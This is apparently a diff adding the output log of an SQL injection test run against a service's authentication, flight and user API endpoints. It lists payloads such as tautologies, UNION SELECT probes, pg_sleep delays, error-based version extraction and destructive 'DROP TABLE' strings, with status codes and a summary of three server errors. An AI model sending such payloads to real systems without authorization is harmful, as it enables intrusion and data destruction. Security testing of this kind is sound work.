@@ -1,0 +1,94 @@
+================================================================================
+SQL INJECTION TESTING SUITE
+================================================================================
+Started: 2025-11-05 02:07:59.953685
+
+
+================================================================================
+TEST 1: AUTHENTICATION ENDPOINTS
+================================================================================
+
+1.1 Testing initiateSignIn - phoneNumber field
+  Payload: ' OR '1'='1                    → Status: 400 (0.20s)
+  Payload: ' OR 1=1--                     → Status: 400 (0.14s)
+  Payload: ' OR 'x'='x                    → Status: 400 (0.12s)
+  Payload: ') OR ('1'='1                  → Status: 400 (0.13s)
+  Payload: ' UNION SELECT NULL--          → Status: 400 (0.12s)
+
+1.2 Testing completeSignIn - challengeCode field
+  Payload: ' OR '1'='1                    → Status: 400 (0.12s)
+  Payload: ' OR 1=1--                     → Status: 400 (0.11s)
+  Payload: ' OR 'x'='x                    → Status: 400 (0.11s)
+  Payload: ') OR ('1'='1                  → Status: 400 (0.13s)
+  Payload: ' UNION SELECT NULL--          → Status: 400 (0.11s)
+
+1.3 Testing completeSignIn - phoneNumber field
+  Payload: ' OR '1'='1                    → Status: 500 (0.12s)
+  Payload: ' OR 1=1--                     → Status: 500 (0.11s)
+  Payload: ' OR 'x'='x                    → Status: 500 (0.12s)
+
+================================================================================
+TEST 2: FLIGHT ENDPOINTS
+================================================================================
+
+2.1 Testing GET /v1/flight/:id with SQL injection
+  Payload: 1' OR '1'='1                   → Status: 200 (1.65s)
+  Payload: 999999' UNION SELECT NULL--    → Status: 200 (1.96s)
+  Payload: 1; DROP TABLE flights--        → Status: 200 (1.90s)
+
+2.2 Testing GET /v1/flight with query params
+  Payload: ' OR '1'='1                    → Status: 200 (1.45s)
+  Payload: 1; SELECT pg_sleep(5)--        → Status: 200 (1.75s)
+
+================================================================================
+TEST 3: USER ENDPOINTS
+================================================================================
+
+3.1 Testing GET /v1/user/:userId (even though it returns 404)
+  Payload: 20254' OR '1'='1               → Status: 404 (0.16s)
+  Payload: 20254; DROP TABLE users--      → Status: 404 (0.13s)
+
+================================================================================
+TEST 4: TIME-BASED BLIND SQL INJECTION
+================================================================================
+
+4.1 Testing PostgreSQL time delays
+  Normal request       → Status: 200 Time: 0.66s
+  Sleep 5 seconds      → Status: 400 Time: 0.13s
+  Sleep 3 seconds      → Status: 400 Time: 0.11s
+
+================================================================================
+TEST 5: ERROR-BASED SQL INJECTION
+================================================================================
+
+5.1 Looking for SQL error messages
+  Payload: ' AND 1=CONVERT(int, (SELECT @@version))
+    Status: 400, SQL Error: False
+  Payload: ' AND extractvalue(1, concat(0x7e, versi
+    Status: 400, SQL Error: False
+  Payload: ' AND 1=(SELECT * FROM (SELECT COUNT(*),
+    Status: 400, SQL Error: False
+
+================================================================================
+SUMMARY
+================================================================================
+
+Total tests performed: 26
+Server errors (5xx): 3
+Timing anomalies (>3s): 0
+
+Response status distribution:
+  200: 6
+  400: 15
+  404: 2
+  500: 3
+
+⚠️ SERVER ERRORS DETECTED:
+  /v1/auth/completeSignIn - Status: 500
+  /v1/auth/completeSignIn - Status: 500
+  /v1/auth/completeSignIn - Status: 500
+
+✅ Results saved to sql_injection_test_results.json
+
+Completed: 2025-11-05 02:08:11.892840
+================================================================================
